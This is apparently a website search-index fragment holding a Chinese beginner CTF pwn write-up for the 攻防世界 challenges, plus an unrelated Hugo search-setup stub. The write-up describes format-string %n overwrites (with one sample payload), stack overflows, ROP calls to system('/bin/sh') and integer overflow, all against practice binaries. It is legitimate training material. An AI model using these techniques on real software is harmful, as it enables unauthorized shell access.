1.从分析来看，解题关键是拿到shell\n2.查看文件，保护，运行\n64位，NX保护。\n嗯，就一句话，没啥用。\n3.扔进IDA里面看一下\n发现这个函数，那么只要让它执行这个函数，就可以拿到shell了。\n发现这边有一个溢出。开始编写脚本。\n解题： 编写脚本\n 利用一个溢出将callsystem函数的地址编写进去\n完成。\n题目 level2 题目描述： 菜鸡请教大神如何获得flag，大神告诉他‘使用’面向返回的编程（ROP）就可以了\n题目分析： 1.从题目描述可知，要用到ROP技术。\n2.查看文件格式，保护，运行。\n32位，NX保护\n程序流程。\n3.扔进IDA里看一下。\n存在system函数，可以将‘/bin/sh’，写入，获得shell\n存在溢出漏洞。可以开始编写脚本了\n解题： 构建system（/bin/sh），获得shell\n完成。\n题目 string 题目描述： 菜鸡遇到了Dragon,有一位巫师可以帮助他逃离危险，但似乎需要一些要求\n题目分析： 1.从题目描述来看，解题的关键在“巫师”\n2.查看文件格式，保护。\n64位，保护除了PIE都开了。\n3.扔到IDA里面看一下。（400CA6）\nok，找到巫师了，不过，需要条件*a1==a1[1]。\n观察一下，可以发现*a1==a1[1],即要满足 *v3==v3[1]。\n这时候发现这边存在一个输出漏洞。（printf(\u0026amp;……，\u0026amp;……)）\n想到使用%n来修改值。\n查看一下偏移量。\n偏移量是7。\n再来找一下地址。\n这边泄露了v4地址，即v3\n并且出现了可以将v1变成一个函数来执行外部命令的语句。\n解题： 完成。\n题目 int_overflow 题目描述： 菜鸡感觉这题似乎没有办法溢出，真的么？\n题目分析： 1.从题目来看，这题解题关键在于“int_overflow”\n2.查看文件，保护，运行\n3.扔进IDA里面看一下\n一个溢出漏洞\n条件\n这时候联想到题目的提示int_overflow\n无符号int型，最大256，257开始长度变为1\n又发现这个……\n解题： 完成。\n题目 cgpwn2 题目描述： 菜鸡认为自己需要一个字符串\n题目分析： 1.查看文件，保护，运行。\n2.扔进IDA里面看一下\n很明显的一个漏洞\n调用了system函数，但是打印“hehehe”。去找了一下有没有“/bin/sh”，没找到。只能自己输入了\n解题： 完成。\n","date":"July 7, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/zh-tw/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/","summary":"攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的\n题目分析： nc链接，运行，拿到shell\n解题： 1.nc链接IP（端口是空格）\n2.ls查看文件，cat flag 获得flag\n题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用\n题目分析： 1.从题目描述来看，解题的关键是prinf\n2.查看文件格式，保护设置，运行一下\n发现是一个32位的文件，开启了NX、Stack保护\n这是程序的流程\n3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下\n这是一个高危漏洞！！！具体用法先放着，往下看。\n看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！\n而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。\n4.格式化字符串漏洞的简单运用\n%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表\t示将0x64写入偏移10处保存的指针所指向的地址\n解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量\n输入aaaa，发现0x61616161（aaaa）偏移量为10\n2.编写脚本\npayload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里\n3.运行\n拿到falg\n4.注：\n还可以这样写payload=‘aaaa’+p32（0x0804A068）+'%11$n'\n题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办\n题目分析： 1.从描述来看，关键在于“年龄”\n2.查看文件格式，保护设置，运行一下\n64位，开启了stack、NX保护。\n这是程序基本流程。\n3.扔到IDA中看一下\n答案就在这！！！\n整体看一下\n所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个\n漏洞……\n查看一下\nv4下面正好是v5，那就可以直接覆盖了\n解题： 解决。\n题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思\n题目分析： 1.题目描述貌似没啥用，不管了\n2.查看文件，保护，运行一下\n64位，开启了NX保护\n就一句话……","tags":null,"title":"攻防世界WP"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"}]